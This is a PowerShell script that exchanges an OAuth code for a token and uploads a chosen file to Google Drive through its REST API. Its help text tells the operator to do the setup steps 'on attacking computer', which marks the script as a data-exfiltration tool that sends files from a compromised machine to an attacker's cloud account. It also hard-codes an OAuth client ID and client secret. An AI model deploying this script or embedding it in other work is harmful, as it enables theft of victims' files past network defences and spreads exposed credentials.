<#

.SYNOPSIS
This is a Powershell script to upload a file to Google Drive using their REST API.

.DESCRIPTION
This Powershell script will upload file to Google Drive using their REST API with the parameters you provide.
Please Note, the script only uploads the content of the file and Not its MetaData.

.PARAMETER SourceFilePath
The path of the file to upload.

.PARAMETER DriveAccessToken
The GoogleDrive access token.


----------------TO BE REMOVED ------------------------
To generate Access tokens setup OAuth2 credentials [Client Id, Client Secret, Redirect URI] on Google Account.
1. On attacking computer. Go to Url in browser-
   https://accounts.google.com/o/oauth2/auth?client_id=<CLIENT_ID>&scope=https://www.googleapis.com/auth/drive&response_type=code&redirect_uri=<REDIRECT_URI>
2. Login if necessary
   <<Redirects to url of format - "http://localhost/oauth2callback?code=4/rZdbtgiL6A5BHJUFhdOKrnSYFhbW4d1GMaMkkL31TWk#">>
3. Copy value of code without trailing '#' from URL
------------------------------------------------------
#>

Param(
    [Parameter(Mandatory=$true)]
    [string]$SourceFilePath,
    [Parameter(Mandatory=$true)]
    [string]$AccessToken
)
 
$body = @{
	code=$AccessToken;
	client_id="740191562411-pobceqj1drk90ua2j76fl08r95vl2cl5.apps.googleusercontent.com";
	client_secret="LK1DekHM0oVcQYdd9dGLjcFJ";
	redirect_uri="http://localhost/oauth2callback";
	grant_type="authorization_code";
};

$headers = @{}
$headers["Content-Type"] = 'application/x-www-form-urlencoded'

$tokens = Invoke-RestMethod -Uri https://www.googleapis.com/oauth2/v4/token -Method POST -Headers $headers -Body $body;
$authorization = "Bearer "+ $tokens.access_token

$headers1 = @{}
$headers1["Authorization"] = $authorization
$headers1["Content-Type"] = 'application/octet-stream'


Invoke-RestMethod -Uri https://www.googleapis.com/upload/drive/v3/files?uploadType=media -Method POST -Headers $headers1 -InFile $SourceFilePath
 
